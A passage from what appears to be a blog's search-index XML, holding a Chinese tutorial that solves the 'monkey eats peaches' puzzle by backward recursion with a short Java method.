class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="猴吃桃子"><a href="#猴吃桃子" class="headerlink" title="猴吃桃子"></a>猴吃桃子</h2><p>有一堆桃子，第一只猴子吃了其中的一半，并多吃了一个，以后每天猴子都吃当前剩下来的一半，然后再多吃一个，第十天的时候（还没吃），发现只剩下一个桃子了，请问，最初总共多少个桃子</p><p>day10： 1</p><p>day9： （day10 + 1） *  2 &#x3D; 4</p><p>day8：（day9 + 1）* 2 &#x3D; 10</p><p>出口：day &#x3D;&#x3D; 10 剩下1</p><p>规律：每一天的桃子数量都是最后一天数量加1乘2</p><p>反向递归</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> heima;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">one</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(getCount(<span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">getCount</span><span class="params">(<span class="type">int</span> day)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(day &lt;= <span class="number">0</span> || day &gt;= <span class="number">11</span>)&#123;</span><br><span class="line">         System.out.println(<span class="string">&quot;当前时间错误&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//递归出口</span></span><br><span class="line">        <span class="keyword">if</span>(day == <span class="number">10</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (getCount(day + <span class="number">1</span>) + <span class="number">1</span>) * <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
